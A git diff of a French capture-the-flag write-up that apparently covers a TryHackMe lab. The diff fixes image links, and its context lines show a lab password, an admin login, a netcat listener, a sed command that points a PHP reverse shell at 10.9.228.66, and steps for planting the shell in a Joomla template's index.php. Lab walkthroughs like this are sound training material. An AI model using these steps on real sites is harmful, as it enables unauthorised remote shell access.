@@ -258,7 +258,7 @@ Le mot de passe est : abcd1234
 
 **At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?**
 
-![page2](!./Task1-02.png)  
+![page2](./Task1-02.png)  
 
 On s'identifie avec :   
 Nom : admin  
@@ -271,11 +271,11 @@ listening on [any] 1234 ...
 
 On écoute sur le port, pour se connecter sur le reverse shell.    
 
-![page3](!./Task1-03.png)
+![page3](./Task1-03.png)
 
 Allez dans Extension-\>Templates-\>Templates     
 
-![page4](!./Task1-04.png)
+![page4](./Task1-04.png)
 
 Allez dans Templates puis dans protostar.    
 
@@ -290,11 +290,11 @@ tim@kali:~/Bureau/tryhackme/write-up$ sed -i 's/127.0.0.1/10.9.228.66/g' php-rev
 On télécharge un reverse shell.    
 On le configure.   
 
-![page5](!./Task1-05.png)
+![page5](./Task1-05.png)
 
 On copie le reverse shell dans index.php.   
 
-![page6](!./Task1-06.png)  
+![page6](./Task1-06.png)  
 
 On exécute le reverse-shell.    
 
